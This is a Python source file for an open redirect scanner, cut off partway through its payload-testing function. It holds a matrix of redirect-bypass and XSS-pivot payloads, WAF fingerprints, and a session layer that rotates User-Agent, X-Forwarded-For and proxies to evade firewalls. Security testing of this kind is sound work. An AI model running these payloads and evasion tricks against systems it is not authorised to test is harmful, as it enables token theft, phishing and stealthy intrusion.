#!/usr/bin/env python3
"""
auditing_tools/open_redirect_finder.py — Open Redirect Auditor (v4.0)
═══════════════════════════════════════════════════════════════════════════════

Military-grade open redirect detection.

SAFETY MODEL
────────────
Every request flows through `EvasionSession`:
  • Jittered pacing (thread-safe, defeats fixed-interval fingerprints)
  • User-Agent + X-Forwarded-For rotation
  • Optional proxy rotation
  • Exponential back-off on 403/406/429/503
  • 60-second cool-down after a WAF block page

Aggressive mode (`--aggressive`) extends payloads, encoding variants, and
context probing. It is off by default.

DETECTION PIPELINE
──────────────────
  1. Surface discovery      query / path / body / form params
  2. Baseline discipline    random non-URL value must NOT redirect externally
  3. Payload matrix         45+ payloads × 4 detection vectors:
                              • Location / Refresh / X-Redirect-URL headers
                              • JSON body redirect keys
                              • <meta http-equiv=refresh>
                              • DOM sinks (window.location / location.assign)
  4. Bypass variants        HPP, method rotation, content-type switching
  5. Client-side fallback   for surfaces where the server doesn't 3xx but the
                            page contains JS redirect logic
  6. Chains                 OAuth / SSO / password-reset / email-verify /
                            XSS / CSRF / phishing contextual impact

CONFIRMATION (no false positives)
─────────────────────────────────
A finding is CONFIRMED only when:
  • the payload carries a can_confirm flag (excludes validation-bypass-only
    payloads like dot_prefix_suffix and unicode homographs), AND
  • the destination host resolves to the Argus confirmation domain or a
    subdomain thereof, AND
  • the response is not a denial page (login/403/406), AND
  • for header-based detection, the header name is not the baseline-redirect
    the endpoint already emits regardless of payload.

SEVERITY (impact-driven, not param-name driven)
───────────────────────────────────────────────
  CRITICAL   Confirmed redirect on an OAuth / SAML / SSO endpoint (token
             leak, assertion theft), OR confirmed with a `code` / `token` /
             `state` marker in the URL (OAuth code flow).
  HIGH       Confirmed redirect on an auth-adjacent flow: password reset,
             email verification, login `next`/`return`, or SAML RelayState.
  MEDIUM     Confirmed redirect on a generic endpoint (phishing surface).
  LOW        Confirmed client-side sink only (meta refresh / DOM) — XSS
             pivot potential but no server-side redirect.
  INFO       Properly protected (endpoint rejects the payload / no redirect).

CHAINS
──────
  open-redirect-oauth          OAuth redirect_uri confirmed (token leak)
  open-redirect-sso            SAML RelayState / SSO confirmed (assertion theft)
  open-redirect-pwreset        Password reset / email verify redirect confirmed
  open-redirect-phishing       Generic confirmed redirect
  open-redirect-xss            javascript: / data: pivot to stored XSS
  open-redirect-csrf           redirect param + missing CSRF protection
  open-redirect-ssrf           server-side fetch of redirect target (potential)

OUTPUTS
───────
  open_redirect_findings.json       every finding
  open_redirect_confirmed.json      HIGH / CRITICAL only
  open_redirect_chains.json         structured chain records
  open_redirect_candidates.txt      flat triage
  open_redirect_confirmed.txt       confirmed flat triage
  open_redirect_oauth.txt           OAuth/SSO-specific subset
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import secrets
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.open_redirect")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    return getattr(CFG, key, default) if CFG_LOADED else default


def _redirect_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("redirect", {}) or {}
    return {
        "rate_limit":  entry.get("rate_limit", 3),
        "concurrency": entry.get("concurrency", 4),
        "timeout":     entry.get("timeout", 12),
        "jitter":      entry.get("jitter", 0.4),
        "proxies":     entry.get("proxies", []),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        h.update(getattr(CFG, "AUTH_HEADERS", {}) or {})
    return h


def _confirmation_domain() -> str:
    d = _cfg("REDIRECT_CONFIRMATION_DOMAIN", "example.com")
    return (d or "example.com").strip().lower()


# ═════════════════════════════════════════════════════════════════════════════
#  SEVERITY
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

    @property
    def rank(self) -> int:
        return {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[self.value]


# ═════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION + EVASION
# ═════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: dict[str, dict] = {
    "Cloudflare":  {"headers": ["cf-ray", "__cf_bm", "cf-cache-status"],
                    "body":    ["Attention Required! | Cloudflare"]},
    "Akamai":      {"headers": ["akamai-grn", "x-akamai-transformed", "_abck"],
                    "body":    ["Access Denied", "Reference&#32;&#35;"]},
    "Imperva":     {"headers": ["x-iinfo", "incap_ses", "_Incapsula_Resource"],
                    "body":    ["Pardon Our Interruption"]},
    "AWS WAF":     {"headers": ["x-amzn-requestid", "x-amzn-errortype"],
                    "body":    ["Request blocked", "AWS WAF"]},
    "F5 BIG-IP":   {"headers": ["x-wa-info", "bigipserver"],
                    "body":    ["The requested URL was rejected"]},
    "Sucuri":      {"headers": ["x-sucuri-id", "x-sucuri-cache"],
                    "body":    ["Sucuri WebSite Firewall"]},
    "DataDome":    {"headers": ["x-datadome", "datadome"],
                    "body":    ["captcha-delivery"]},
    "ModSecurity": {"headers": ["x-mod-security"], "body": ["ModSecurity"]},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]


@dataclass
class WAFReport:
    vendor: str = "unknown"
    confidence: int = 0
    signals: list[str] = field(default_factory=list)
    blocked: bool = False


@dataclass
class EvasionProfile:
    rate_limit: float = 3.0
    jitter: float = 0.4
    rotate_ua: bool = True
    rotate_xff: bool = True
    proxies: list[str] = field(default_factory=list)
    backoff_codes: tuple[int, ...] = (403, 406, 429, 503)
    max_backoff: float = 30.0
    cooldown_after_block: float = 60.0


class EvasionSession:
    """Thread-safe, WAF-aware session with pacing + UA/XFF rotation."""

    def __init__(self, profile: EvasionProfile, timeout: int = 12):
        self.profile = profile
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update(_target_headers())

        self._min_interval = 1.0 / profile.rate_limit if profile.rate_limit > 0 else 0.0
        self._last = 0.0
        self._backoff = 0.0
        self._cooldown_until = 0.0
        self._proxy_idx = 0
        self._ua_idx = 0
        self._xff_counter = 0
        self._lock = threading.Lock()

    def __enter__(self): return self
    def __exit__(self, *exc):
        try: self.session.close()
        except Exception: pass

    def _pace(self):
        if self._min_interval > 0 or self._backoff > 0:
            with self._lock:
                now = time.monotonic()
                if now < self._cooldown_until:
                    time.sleep(self._cooldown_until - now)
                interval = self._min_interval + random.uniform(0, self.profile.jitter)
                elapsed = time.monotonic() - self._last
                if elapsed < interval:
                    time.sleep(interval - elapsed)
                if self._backoff > 0:
                    time.sleep(self._backoff)
                self._last = time.monotonic()

    def _rotate(self):
        with self._lock:
            if self.profile.rotate_ua:
                self.session.headers["User-Agent"] = USER_AGENTS[
                    self._ua_idx % len(USER_AGENTS)
                ]
                self._ua_idx += 1
            if self.profile.rotate_xff:
                self._xff_counter += 1
                o = self._xff_counter % 254 + 1
                self.session.headers["X-Forwarded-For"] = f"10.0.{o}.{o}"
                self.session.headers["X-Real-IP"] = f"10.0.{o}.{o}"

    def _proxy(self) -> Optional[dict]:
        if not self.profile.proxies:
            return None
        with self._lock:
            p = self.profile.proxies[self._proxy_idx % len(self.profile.proxies)]
            self._proxy_idx += 1
        return {"http": p, "https": p}

    def request(self, method: str, url: str, headers: Optional[dict] = None,
                **kwargs) -> Optional[requests.Response]:
        self._pace()
        self._rotate()
        proxy = self._proxy()
        try:
            resp = self.session.request(
                method, url, headers=headers,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False, proxies=proxy, **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

        if resp.status_code in self.profile.backoff_codes:
            self._backoff = min(self.profile.max_backoff,
                                max(1.0, self._backoff * 2 or 1.0))
            low = (resp.text or "")[:2000].lower()
            if any(w in low for w in ("blocked", "firewall", "captcha", "denied")):
                self._cooldown_until = time.monotonic() + self.profile.cooldown_after_block
                log.warning("  WAF block — cooling down %.0fs",
                            self.profile.cooldown_after_block)
        elif resp.status_code < 400:
            self._backoff = 0.0
        return resp

    def get(self, url: str, headers: Optional[dict] = None, **kwargs):
        return self.request("GET", url, headers=headers, **kwargs)

    def benign_get(self, url: str) -> Optional[requests.Response]:
        try:
            return self.session.get(url, timeout=self.timeout, verify=False)
        except requests.RequestException:
            return None


def detect_waf(session: EvasionSession, url: str) -> WAFReport:
    report = WAFReport()
    try:
        resp = session.benign_get(url)
    except Exception:
        return report
    if resp is None:
        return report

    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
    body_blob = (resp.text or "")[:4000].lower()

    for vendor, sig in WAF_SIGNATURES.items():
        hits = [f"header:{h}" for h in sig["headers"] if h.lower() in header_blob]
        hits += [f"body:{b[:40]}" for b in sig["body"] if b.lower() in body_blob]
        if hits:
            report.vendor = vendor
            report.signals = hits
            report.confidence = min(100, 50 + 15 * len(hits))
            break

    if resp.status_code in (403, 406, 429, 503):
        low = (resp.text or "")[:2000].lower()
        if any(w in low for w in ("blocked", "denied", "firewall", "captcha")):
            report.blocked = True
            if report.vendor == "unknown":
                report.vendor = "generic-waf"
                report.confidence = 40
    return report


# ═════════════════════════════════════════════════════════════════════════════
#  PAYLOAD MATRIX
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT = 12
MAX_URLS = 5000


@dataclass(frozen=True)
class Payload:
    label: str
    template: str
    boost: int
    can_confirm: bool = True
    vector_class: str = "redirect"   # "redirect" | "xss_pivot" | "validation"
    aggressive_only: bool = False


PAYLOAD_MATRIX: list[Payload] = [
    # ── Direct external ───────────────────────────────────────────────────
    Payload("direct_https",  "https://{CONF}", 30),
    Payload("direct_http",   "http://{CONF}", 28),

    # ── Protocol-relative ─────────────────────────────────────────────────
    Payload("protocol_relative",              "//{CONF}", 35),
    Payload("protocol_relative_backslash",    "\\\\{CONF}", 30),
    Payload("protocol_relative_slash_backslash", "/\\{CONF}", 30),
    Payload("quad_slash",                     "////{CONF}", 28),
    Payload("triple_slash",                   "https:///{CONF}", 30),

    # ── Userinfo / @-confusion ────────────────────────────────────────────
    Payload("at_confusion",                 "https://{HOST}@{CONF}", 30),
    Payload("at_confusion_scheme_relative", "//{HOST}@{CONF}", 30),
    Payload("at_confusion_empty_user",      "https://{HOST}:@{CONF}", 25),
    Payload("at_confusion_complex_user",    "https://x:x@{CONF}", 22),

    # ── Subdomain suffix (attacker controls CONF, so target.com.CONF is confirmed)
    Payload("subdomain_suffix",    "https://{HOST}.{CONF}", 25, can_confirm=True),
    Payload("dot_prefix_suffix",   "https://{CONF}.{HOST}", 20, can_confirm=False),

    # ── Fragment / query ──────────────────────────────────────────────────
    Payload("fragment",           "https://{CONF}#.target", 20),
    Payload("target_in_query",    "https://{CONF}?target={HOST}", 20),
    Payload("target_in_fragment", "https://{CONF}#{HOST}", 20),

    # ── Path prefix (startsWith bypass) ───────────────────────────────────
    Payload("target_in_path", "https://{CONF}/{HOST}", 18),

    # ── URL encoded ───────────────────────────────────────────────────────
    Payload("url_encoded",    "https://%65%78%61%6D%70%6C%65%2E%63%6F%6D", 25),
    Payload("double_encoded", "https://{CONF}%2f..%2f", 18),
    Payload("encoded_protocol_relative", "%2f%2f{CONF}", 22),

    # ── Null byte / whitespace ────────────────────────────────────────────
    Payload("null_byte",        "{CONF}%00target.com", 20),
    Payload("whitespace_tab",   "{CONF}%09", 18),
    Payload("whitespace_space", "%20{CONF}", 18),
    Payload("trailing_space",   "https://{CONF} ", 18),
    Payload("trailing_tab",     "https://{CONF}\t", 15),

    # ── Scheme confusion ──────────────────────────────────────────────────
    Payload("scheme_missing_slashes", "https:{CONF}", 20),
    Payload("scheme_mixed_case",      "hTtPs://{CONF}", 22),
    Payload("scheme_upper",           "HTTPS://{CONF}", 20),

    # ── Unicode IDN homograph (validation only, cannot confirm) ───────────
    Payload("unicode_dot",   "https://{CONF}\u3002attacker", 18, can_confirm=False),
    Payload("unicode_slash", "\uff0f\uff0f{CONF}", 15, can_confirm=False),

    # ── XSS pivots ────────────────────────────────────────────────────────
    Payload("javascript_uri", "javascript:alert(document.domain)", 20,
            can_confirm=False, vector_class="xss_pivot"),
    Payload("data_uri", "data:text/html,<script>alert(document.domain)</script>", 15,
            can_confirm=False, vector_class="xss_pivot"),
    Payload("crlf_javascript", "java%0d%0ascript%0d%0a:alert(1)", 15,
            can_confirm=False, vector_class="xss_pivot"),

    # ── Aggressive-only extensions ────────────────────────────────────────
    Payload("tab_prefix",    "\t//{CONF}", 18, aggressive_only=True),
    Payload("newline_prefix", "\n//{CONF}", 18, aggressive_only=True),
    Payload("cr_prefix",     "\r//{CONF}", 15, aggressive_only=True),
    Payload("no_colon",      "//{CONF}:443/", 22, aggressive_only=True),
    Payload("userinfo_chain","https://{HOST}@{HOST}@{CONF}", 18, aggressive_only=True),
    Payload("path_traversal", "https://{HOST}/..%2f..%2f..%2f@{CONF}", 15,
            aggressive_only=True),
    Payload("double_at",      "https://{CONF}@{CONF}@evil", 15,
            aggressive_only=True, can_confirm=False),
]

# Client-side payloads — literal appearance in body required
CLIENT_PAYLOADS: list[Payload] = [
    Payload("meta_direct",             "https://{CONF}", 30),
    Payload("meta_protocol_relative",  "//{CONF}", 25),
    Payload("dom_javascript",          "javascript:alert(document.domain)", 20,
            can_confirm=False, vector_class="xss_pivot"),
    Payload("dom_data_uri",            "data:text/html,<script>alert(1)</script>", 15,
            can_confirm=False, vector_class="xss_pivot"),
]


# ═════════════════════════════════════════════════════════════════════════════
#  PARAM CONTEXT WEIGHTS
# ═════════════════════════════════════════════════════════════════════════════

CONTEXT_WEIGHTS = {
    # OAuth / SSO
    "redirect_uri": 40, "redir_uri": 40,
    "returnto": 35, "relaystate": 35,
    "return_to": 30, "return_url": 30,
    "callback": 30, "callback_url": 30,
    # Login flows
    "next": 25, "continue": 25,
    "return": 25, "back": 20, "backto": 20,
    # Generic
    "redirect": 15, "redirect_url": 15, "redirect_to": 15,
    "url": 15, "redir": 15, "goto": 15,
    "destination": 10, "dest": 10, "target": 10, "to": 10,
    "forward": 10, "out": 10, "go": 10, "link": 10,
    "view": 10, "jump": 10, "jump_url": 10,
    # Low-context
    "backurl": 8, "back_url": 8, "forward_url": 8,
    "success_url": 8, "cancel_url": 8,
    "logout_redirect": 8, "logout": 8,
    "service": 8, "origin": 8, "originurl": 8,
    "image_url": 5, "file_url": 5, "pic": 5,
    "action": 5, "action_url": 5, "clickurl": 5,
    "rurl": 8, "sp_url": 5, "ext": 5,
}
REDIRECT_PARAMS = set(CONTEXT_WEIGHTS.keys())

# OAuth markers
OAUTH_PARAMS = {"redirect_uri", "redir_uri", "returnto", "relaystate", "return_to"}
OAUTH_PARAM_HINTS = OAUTH_PARAMS | {
    "client_id", "response_type", "scope", "state", "nonce",
    "code_challenge", "code_challenge_method", "code", "id_token_hint",
    "login_hint", "prompt", "audience", "access_type",
}
OAUTH_PATH_STRICT = {
    "oauth", "oauth2", "openid", "oidc", "sso", "saml",
    "authorize", "connect", "oidc-callback",
}
AUTH_PATH_HINTS = {"auth", "login", "signin", "signup", "session"}

# Path-based redirect endpoint guesses
PATH_REDIRECT_SEGMENTS = (
    "/redirect", "/out", "/go", "/redir", "/forward", "/jump", "/link",
)

# Header names that carry redirects (checked in response)
REDIRECT_HEADERS = (
    "location", "refresh", "x-redirect-url", "x-redirect",
    "x-forward-to", "x-forward-url", "redirect-url", "redirect-to",
    "x-redirect-location", "content-location",
)

# JSON body keys (lowercase set)
JSON_REDIRECT_KEYS_LC = frozenset({
    "redirect", "redirect_uri", "redirect_url", "url", "location",
    "target", "next", "return_to", "returnurl", "return_url", "goto",
    "destination", "continue", "callback", "forward", "redirectto",
})

# Client-side sink patterns
META_REFRESH_RE = re.compile(
    r'<meta[^>]+http-equiv\s*=\s*["\']?refresh["\']?[^>]*'
    r'content\s*=\s*["\']?[^"\'>]*url\s*=\s*([^"\'>\s]+)',
    re.I,
)
REFRESH_HEADER_RE = re.compile(r'^\s*\d+\s*;\s*url\s*=\s*(\S+)', re.I)

DOM_SINK_PATTERNS = [
    re.compile(r'window\.location(?:\.href)?\s*=\s*["\']([^"\']+)', re.I),
    re.compile(r'document\.location(?:\.href)?\s*=\s*["\']([^"\']+)', re.I),
    re.compile(r'location\.replace\s*\(\s*["\']([^"\']+)', re.I),
    re.compile(r'location\.assign\s*\(\s*["\']([^"\']+)', re.I),
    re.compile(r'window\.open\s*\(\s*["\']([^"\']+)', re.I),
]

DENIAL_MARKERS = (
    "access denied", "not authorized", "permission denied",
    "login required", "unauthorized", "invalid request",
    "not permitted", "forbidden",
)


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class RedirectSurface:
    url: str
    param_name: str
    param_value: str = ""
    location: str = "query"       # "query" | "path" | "body"
    is_oauth: bool = False
    is_sso: bool = False
    is_pwreset: bool = False
    is_email_verify: bool = False
    oauth_markers: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param_name": self.param_name,
            "param_value": self.param_value, "location": self.location,
            "is_oauth": self.is_oauth, "is_sso": self.is_sso,
            "is_pwreset": self.is_pwreset,
            "is_email_verify": self.is_email_verify,
            "oauth_markers": self.oauth_markers,
        }


@dataclass
class OpenRedirectFinding:
    target: str
    param_name: str
    vector: str
    param_location: str = "query"
    severity: Severity = Severity.MEDIUM
    confidence: int = 50
    confirmed: bool = False
    payload: str = ""
    payload_label: str = ""
    evidence: str = ""
    redirect_location: str = ""
    http_status: int = 0
    is_oauth: bool = False
    is_sso: bool = False
    chain_ids: list[str] = field(default_factory=list)
    request_curl: str = ""
    waf_vendor: str = ""
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        raw = f"{self.target}|{self.param_name}|{self.vector}"
        return hashlib.sha256(raw.encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "target":            self.target,
            "target_host":       self.target_host,
            "param_name":        self.param_name,
            "param_location":    self.param_location,
            "vector":            self.vector,
            "severity":          self.severity.value,
            "confidence":        self.confidence,
            "confirmed":         self.confirmed,
            "payload":           (self.payload or "")[:1024],
            "payload_label":     self.payload_label,
            "evidence":          (self.evidence or "")[:1024],
            "redirect_location": (self.redirect_location or "")[:1024],
            "http_status":       self.http_status,
            "is_oauth":          self.is_oauth,
            "is_sso":            self.is_sso,
            "chain_ids":         self.chain_ids,
            "request_curl":      (self.request_curl or "")[:2048],
            "waf_vendor":        self.waf_vendor,
            "auth_enabled":      self.auth_enabled,
            "details":           self.details,
            "finding_hash":      self.finding_hash,
            "first_seen":        self.first_seen or _db_now(),
        }


@dataclass
class OpenRedirectChain:
    chain_id: str
    name: str
    severity: Severity
    steps: list[str]
    finding_hashes: list[str] = field(default_factory=list)
    evidence: str = ""

    def to_dict(self) -> dict:
        return {
            "chain_id":       self.chain_id,
            "name":           self.name,
            "severity":       self.severity.value,
            "steps":          self.steps,
            "finding_hashes": self.finding_hashes,
            "evidence":       self.evidence[:600],
        }


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls, seen = [], set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        tok = line.split()[0]
        if not tok.startswith(("http://", "https://")):
            tok = "https://" + tok
        if tok not in seen:
            seen.add(tok)
            urls.append(tok)
    return urls


def _build_test_url(original_url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(original_url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new_params = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_params)))


def _render_payload(template: str, target_host: str, confirmation: str) -> str:
    return template.replace("{HOST}", target_host or "target").replace("{CONF}", confirmation)


def _normalize_host(host: str) -> str:
    return (host or "").strip().lower().rstrip(".").split(":")[0]


@dataclass
class RedirectAnalysis:
    is_external: bool
    is_confirmation_domain: bool
    actual_host: str
    normalized_location: str


def _analyze_redirect(location: str, target_host: str, confirmation: str) -> RedirectAnalysis:
    if not location:
        return RedirectAnalysis(False, False, "", "")

    loc = location.strip()
    loc_norm = loc.replace("\\", "/")
    loc_norm = re.sub(r"^/{3,}", "//", loc_norm)
    loc_norm = re.sub(r"^(https?):(?!/)", r"\1://", loc_norm, flags=re.I)

    parsed = None
    if loc_norm.startswith("//"):
        parsed = urllib.parse.urlparse("https:" + loc_norm)
    elif loc_norm.startswith(("http://", "https://")):
        parsed = urllib.parse.urlparse(loc_norm)

    if not parsed:
        return RedirectAnalysis(False, False, "", loc_norm)

    actual_host = _normalize_host(parsed.hostname or "")
    target_norm = _normalize_host(target_host)
    confirmation_norm = _normalize_host(confirmation)

    is_external = bool(actual_host) and actual_host != target_norm
    is_confirmation = (
        actual_host == confirmation_norm
        or actual_host.endswith("." + confirmation_norm)
    )
    return RedirectAnalysis(is_external, is_confirmation, actual_host, loc_norm)


def _classify_surface_context(
    url: str, param_names: set[str],
) -> dict:
    """
    Determine the endpoint's business context for severity scoring.

    Returns dict with is_oauth, is_sso, is_pwreset, is_email_verify,
    oauth_markers.
    """
    parsed = urllib.parse.urlparse(url)
    segments = {s.lower() for s in parsed.path.split("/") if s}
    param_set = {p.lower() for p in param_names}

    is_oauth = bool(
        segments & OAUTH_PATH_STRICT
        or (segments & AUTH_PATH_HINTS and OAUTH_PARAM_HINTS & param_set)
        or (OAUTH_PARAMS & param_set and (
            "state" in param_set or "client_id" in param_set
            or "response_type" in param_set
        ))
    )

    is_sso = bool(
        "saml" in segments
        or "sso" in segments
        or "relaystate" in param_set
        or "samlresponse" in param_set
    )

    is_pwreset = any(
        s in segments for s in ("reset", "resetpassword", "forgot", "recover")
    ) or any(
        p in param_set for p in ("reset_url", "reset_token", "password_reset")
    )

    is_email_verify = any(
        s in segments for s in ("verify", "verification", "confirm", "activate")
    ) or any(p in param_set for p in ("verify_url", "confirm_url", "activation_url"))

    markers = [
        m for m in OAUTH_PARAM_HINTS if m in param_set
    ]
    return {
        "is_oauth": is_oauth,
        "is_sso": is_sso,
        "is_pwreset": is_pwreset,
        "is_email_verify": is_email_verify,
        "oauth_markers": markers,
    }


def _context_score(param: str) -> int:
    p = (param or "").lower()
    if p in CONTEXT_WEIGHTS:
        return CONTEXT_WEIGHTS[p]
    for known, weight in CONTEXT_WEIGHTS.items():
        if known in p:
            return weight
    return 5


def _body_snippet(resp: requests.Response, max_len: int = 500) -> str:
    try:
        return resp.text[:max_len].replace("\n", " ").strip()
    except Exception:
        return ""


def _build_curl(
    method: str, url: str,
    headers: Optional[dict] = None,
    json_body: Optional[dict] = None,
    form_body: Optional[dict] = None,
) -> str:
    parts = [f"curl -X {method} '{url}'"]
    if headers:
        for k, v in headers.items():
            if k.lower() in ("cookie", "authorization"):
                parts.append(f"-H '{k}: {v[:20]}...'")
            else:
                parts.append(f"-H '{k}: {v}'")
    if json_body:
        parts.append("-H 'Content-Type: application/json'")
        parts.append(f"-d '{json.dumps(json_body)[:300]}'")
    elif form_body:
        parts.append(f"-d '{urllib.parse.urlencode(form_body)[:300]}'")
    return " ".join(parts)


def _has_denial_marker(resp: requests.Response) -> bool:
    try:
        body = resp.text[:2000].lower()
    except Exception:
        return False
    return any(m in body for m in DENIAL_MARKERS)


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def discover_surfaces(urls: list[str]) -> list[RedirectSurface]:
    surfaces: list[RedirectSurface] = []
    seen: set[tuple] = set()

    for url in urls:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        context = _classify_surface_context(url, set(params.keys()))

        for pname, pvals in params.items():
            pname_lower = pname.lower()
            if pname_lower not in REDIRECT_PARAMS:
                if not any(k in pname_lower for k in REDIRECT_PARAMS):
                    continue
            key = ("query", url, pname)
            if key in seen:
                continue
            seen.add(key)
            surfaces.append(RedirectSurface(
                url=url, param_name=pname,
                param_value=pvals[0] if pvals else "",
                location="query",
                is_oauth=context["is_oauth"],
                is_sso=context["is_sso"],
                is_pwreset=context["is_pwreset"],
                is_email_verify=context["is_email_verify"],
                oauth_markers=context["oauth_markers"],
            ))

        path = parsed.path.lower()
        if any(seg in path for seg in PATH_REDIRECT_SEGMENTS) and not params:
            for guess in ("url", "next", "to", "target", "redirect"):
                key = ("path", url, guess)
                if key in seen:
                    continue
                seen.add(key)
                surfaces.append(RedirectSurface(
                    url=url, param_name=guess, param_value="",
                    location="path",
                    is_oauth=context["is_oauth"],
                    is_sso=context["is_sso"],
                    is_pwreset=context["is_pwreset"],
                    is_email_verify=context["is_email_verify"],
                    oauth_markers=context["oauth_markers"],
                ))

    return surfaces


def discover_surfaces_from_pages(outdir: Path) -> list[RedirectSurface]:
    surfaces: list[RedirectSurface] = []
    pages_file = outdir / "site_pages.json"
    if not pages_file.exists():
        return surfaces
    try:
        data = json.loads(pages_file.read_text())
    except Exception:
        return surfaces

    seen: set[tuple] = set()
    for page in data.get("pages") or []:
        url = page.get("url") or ""
        if not url:
            continue
        for form in page.get("forms") or []:
            method = (form.get("method") or "get").upper()
            if method != "POST":
                continue
            action = form.get("action") or url
            field_names = {(f.get("name") or "").lower() for f in (form.get("fields") or [])}
            context = _classify_surface_context(action, field_names)
            for field_def in form.get("fields") or []:
                fname = (field_def.get("name") or "").lower()
                if fname not in REDIRECT_PARAMS:
                    continue
                key = ("body", action, fname)
                if key in seen:
                    continue
                seen.add(key)
                surfaces.append(RedirectSurface(
                    url=action, param_name=field_def.get("name"),
                    param_value="", location="body",
                    is_oauth=context["is_oauth"],
                    is_sso=context["is_sso"],
                    is_pwreset=context["is_pwreset"],
                    is_email_verify=context["is_email_verify"],
                    oauth_markers=context["oauth_markers"],
                ))
    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def is_param_honored(
    session: EvasionSession,
    surface: RedirectSurface,
    headers: Optional[dict],
    target_host: str,
    confirmation: str,
) -> bool:
    random_val = "argusbaseline" + secrets.token_hex(4)

    if surface.location == "query":
        test_url = _build_test_url(surface.url, surface.param_name, random_val)
        r = session.get(test_url, headers=headers)
    elif surface.location == "body":
        r = session.request(
            "POST", surface.url, headers=headers,
            data={surface.param_name: random_val},
        )
    else:
        return True

    if not r:
        return True  # network error → still test

    if 300 <= r.status_code < 400:
        loc = r.headers.get("Location", "")
        analysis = _analyze_redirect(loc, target_host, confirmation)
        if analysis.is_external:
            log.debug(
                f"  baseline: {surface.url} [{surface.param_name}] "
                f"redirects externally with random value → param ignored"
            )
            return False
    return True


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — DETECTION
# ═════════════════════════════════════════════════════════════════════════════

def _detect_redirect_headers(resp: requests.Response) -> list[tuple[str, str]]:
    hits: list[tuple[str, str]] = []
    for hname in REDIRECT_HEADERS:
        val = resp.headers.get(hname)
        if not val:
            continue
        if hname.lower() == "refresh":
            m = REFRESH_HEADER_RE.match(val)
            if m:
                hits.append(("Refresh", m.group(1)))
        else:
            hits.append((hname, val))
    return hits


def _detect_json_body_redirect(resp: requests.Response) -> list[tuple[str, str]]:
    if not resp.text or len(resp.text) > 100_000:
        return []
    try:
        data = resp.json()
    except Exception:
        return []

    hits: list[tuple[str, str]] = []

    def _walk(obj, depth=0):
        if depth > 4:
            return
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str) and k.lower() in JSON_REDIRECT_KEYS_LC:
                    if "://" in v or v.startswith("//"):
                        hits.append((k, v))
                _walk(v, depth + 1)
        elif isinstance(obj, list):
            for item in obj[:20]:
                _walk(item, depth + 1)

    _walk(data)
    return hits


def _detect_client_side(body: str) -> list[tuple[str, str]]:
    if not body:
        return []
    hits: list[tuple[str, str]] = []
    for m in META_REFRESH_RE.finditer(body):
        hits.append(("meta_refresh", m.group(1).strip()))
    for pat in DOM_SINK_PATTERNS:
        for m in pat.finditer(body):
            hits.append(("dom_sink", m.group(1).strip()))
            if len(hits) > 10:
                break
    return hits[:20]


def _test_one_payload(
    session: EvasionSession,
    surface: RedirectSurface,
    payload_obj: Payload,
    headers: Optional[dict],
    target_host: str,
    confirmation: str,
    waf: WAFReport,
    auth_on: bool,
) -> list[OpenRedirectFinding]:
    findings: list[OpenRedirectFinding] = []

